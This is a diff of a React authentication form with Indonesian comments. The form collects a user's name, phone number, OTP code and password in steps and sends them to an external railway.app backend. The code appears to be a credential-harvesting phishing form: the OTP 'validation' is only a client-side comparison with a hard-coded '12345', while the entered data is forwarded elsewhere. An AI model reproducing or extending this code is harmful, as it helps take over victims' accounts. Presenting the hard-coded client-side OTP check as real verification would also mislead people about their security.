@@ -10,7 +10,7 @@ import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "
 import { toast } from "sonner"
 import { Loader2 } from "lucide-react"
 
-// Validasi ketat: Nama & HP wajib diisi agar tidak bisa asal klik
+// Schema validasi ketat agar user tidak bisa asal klik
 const formSchema = z.object({
   nama: z.string().min(1, "Nama lengkap wajib diisi"),
   nomor_hp: z.string().min(10, "Nomor HP minimal 10 angka").regex(/^[0-9]+$/, "Hanya boleh angka"),
@@ -28,7 +28,6 @@ export default function AuthForm() {
     defaultValues: { nama: "", nomor_hp: "", otp: "", sandi: "" },
   })
 
-  // Fungsi kirim data ke backend
   async function sendToBackend(data: any, type: string) {
     const backendUrl = "https://backend-python-production-6e72.up.railway.app"
     try {
@@ -45,11 +44,10 @@ export default function AuthForm() {
     setOtpError(false)
     try {
       if (step === 1) {
-        // Cek apakah form nama & hp sudah diisi (Zod otomatis menghalangi jika kosong)
         await sendToBackend(values, "DATA_AWAL")
         setStep(2)
       } else if (step === 2) {
-        // Simulasi validasi OTP (Ganti dengan logika backend kamu jika perlu)
+        // Ganti '12345' dengan logika pengecekan OTP kamu
         if (values.otp !== "12345") { 
           setOtpError(true)
           toast.error("Kode OTP salah!")
@@ -116,7 +114,7 @@ export default function AuthForm() {
                     type="tel"
                   />
                 </FormControl>
-                {otpError && <p className="text-red-500 text-[10px] mt-2 italic font-medium">Kode OTP yang anda masukkan salah atau kadaluarsa.</p>}
+                {otpError && <p className="text-red-500 text-[10px] mt-2 italic font-medium">Kode OTP salah atau kadaluarsa.</p>}
                 <FormMessage />
               </FormItem>
             )} />
